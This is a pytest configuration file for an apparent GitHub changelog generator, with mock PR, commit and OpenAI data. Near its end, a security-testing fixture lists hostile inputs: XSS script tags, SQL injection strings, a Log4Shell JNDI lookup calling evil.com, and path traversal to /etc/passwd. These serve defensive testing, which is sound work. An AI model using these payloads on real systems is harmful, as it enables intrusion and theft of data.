"""Pytest configuration and global fixtures."""

import os
import sys
import pytest
import pandas as pd
from unittest.mock import Mock, patch
from datetime import datetime, date
from typing import Dict, List, Any

# Add project root to Python path
sys.path.insert(0, os.path.dirname(__file__))

@pytest.fixture
def mock_github_token():
    """Mock GitHub token for testing."""
    return "ghp_1234567890123456789012345678901234567890"

@pytest.fixture
def mock_openai_key():
    """Mock OpenAI API key for testing."""
    return "sk-1234567890123456789012345678901234567890123456789012345678"

@pytest.fixture
def sample_pr_data():
    """Sample PR data for testing."""
    return pd.DataFrame([
        {
            'number': 123,
            'title': 'Fix authentication bug',
            'merged_at': '2024-01-15T10:30:00Z',
            'branch': 'production'
        },
        {
            'number': 124,
            'title': 'Add new feature',
            'merged_at': '2024-01-16T14:22:00Z',
            'branch': 'production'
        },
        {
            'number': 125,
            'title': 'Update documentation',
            'merged_at': '2024-01-17T09:15:00Z',
            'branch': 'staging'
        }
    ])

@pytest.fixture
def sample_commit_data():
    """Sample commit data for testing."""
    return pd.DataFrame([
        {
            'PR Number': 123,
            'PR Title': 'Fix authentication bug',
            'Commit SHA': 'abc123def456',
            'Commit Message': 'Fix JWT token validation'
        },
        {
            'PR Number': 123,
            'PR Title': 'Fix authentication bug',
            'Commit SHA': 'def456ghi789',
            'Commit Message': 'Add error handling for expired tokens'
        },
        {
            'PR Number': 124,
            'PR Title': 'Add new feature',
            'Commit SHA': 'ghi789jkl012',
            'Commit Message': 'Implement user profile dashboard'
        }
    ])

@pytest.fixture
def mock_github_api_response():
    """Mock GitHub API response data."""
    return [
        {
            'number': 123,
            'title': 'Fix authentication bug',
            'merged_at': '2024-01-15T10:30:00Z',
            'state': 'closed',
            'head': {
                'repo': {
                    'description': 'Test repository for changelog generation'
                }
            }
        },
        {
            'number': 124,
            'title': 'Add new feature',
            'merged_at': '2024-01-16T14:22:00Z',
            'state': 'closed',
            'head': {
                'repo': {
                    'description': 'Test repository for changelog generation'
                }
            }
        }
    ]

@pytest.fixture
def mock_commit_api_response():
    """Mock GitHub commits API response data."""
    return [
        {
            'sha': 'abc123def456',
            'commit': {
                'message': 'Fix JWT token validation'
            }
        },
        {
            'sha': 'def456ghi789',
            'commit': {
                'message': 'Add error handling for expired tokens'
            }
        }
    ]

@pytest.fixture
def mock_openai_response():
    """Mock OpenAI API response."""
    mock_response = Mock()
    mock_choice = Mock()
    mock_message = Mock()
    mock_message.content = """# Changelog

## Fixed
- Fixed authentication bug in JWT token validation [#123]
- Added error handling for expired tokens [#123]

## Added
- Implemented user profile dashboard [#124]
"""
    mock_choice.message = mock_message
    mock_response.choices = [mock_choice]
    return mock_response

@pytest.fixture
def date_range():
    """Sample date range for testing."""
    return {
        'start_date': date(2024, 1, 1),
        'end_date': date(2024, 1, 31)
    }

@pytest.fixture
def repository_info():
    """Sample repository information."""
    return {
        'owner': 'test-owner',
        'repo': 'test-repo',
        'url': 'https://github.com/test-owner/test-repo'
    }

@pytest.fixture(autouse=True)
def reset_environment():
    """Reset environment variables before each test."""
    original_env = os.environ.copy()
    yield
    os.environ.clear()
    os.environ.update(original_env)

@pytest.fixture
def mock_streamlit():
    """Mock streamlit components for testing."""
    with patch('streamlit.error') as mock_error, \
         patch('streamlit.warning') as mock_warning, \
         patch('streamlit.success') as mock_success, \
         patch('streamlit.info') as mock_info, \
         patch('streamlit.stop') as mock_stop, \
         patch('streamlit.secrets') as mock_secrets:
        
        mock_secrets.__getitem__.side_effect = KeyError("No secrets")
        yield {
            'error': mock_error,
            'warning': mock_warning,
            'success': mock_success,
            'info': mock_info,
            'stop': mock_stop,
            'secrets': mock_secrets
        }

class MockResponse:
    """Mock HTTP response for testing."""
    def __init__(self, json_data: Any, status_code: int = 200, headers: Dict[str, str] = None):
        self.json_data = json_data
        self.status_code = status_code
        self.headers = headers or {'X-RateLimit-Remaining': '5000'}
    
    def json(self):
        return self.json_data

@pytest.fixture
def mock_requests_get():
    """Mock requests.get for API testing."""
    with patch('requests.get') as mock_get:
        yield mock_get

# Performance test fixtures
@pytest.fixture
def large_pr_dataset():
    """Large dataset for performance testing."""
    return pd.DataFrame([
        {
            'number': i,
            'title': f'PR #{i}',
            'merged_at': f'2024-01-{i % 28 + 1:02d}T10:30:00Z',
            'branch': 'production' if i % 2 == 0 else 'staging'
        }
        for i in range(1, 1001)  # 1000 PRs
    ])

@pytest.fixture
def malicious_input_samples():
    """Sample malicious inputs for security testing."""
    return {
        'xss_attempts': [
            '<script>alert("xss")</script>',
            'javascript:alert("xss")',
            '"><script>alert("xss")</script>',
            "'; DROP TABLE users; --"
        ],
        'injection_attempts': [
            "'; SELECT * FROM secrets; --",
            '${jndi:ldap://evil.com/x}',
            '../../../etc/passwd',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
        ],
        'pii_samples': [
            'Contact john.doe@example.com for details',
            'Server IP: 192.168.1.100',
            'API Key: ak_1234567890abcdef1234567890abcdef',
            'Visit https://api.example.com/users?token=secret123'
        ]
    }

# Test data generators
def generate_commits(count: int = 10) -> List[Dict[str, Any]]:
    """Generate test commit data."""
    return [
        {
            'sha': f'commit{i:03d}abc',
            'commit': {
                'message': f'Test commit message {i}'
            }
        }
        for i in range(count)
    ]

def generate_prs(count: int = 5) -> List[Dict[str, Any]]:
    """Generate test PR data."""
    return [
        {
            'number': i,
            'title': f'Test PR {i}',
            'merged_at': f'2024-01-{i % 28 + 1:02d}T10:30:00Z',
            'state': 'closed',
            'head': {
                'repo': {
                    'description': 'Test repository'
                }
            }
        }
        for i in range(1, count + 1)
    ]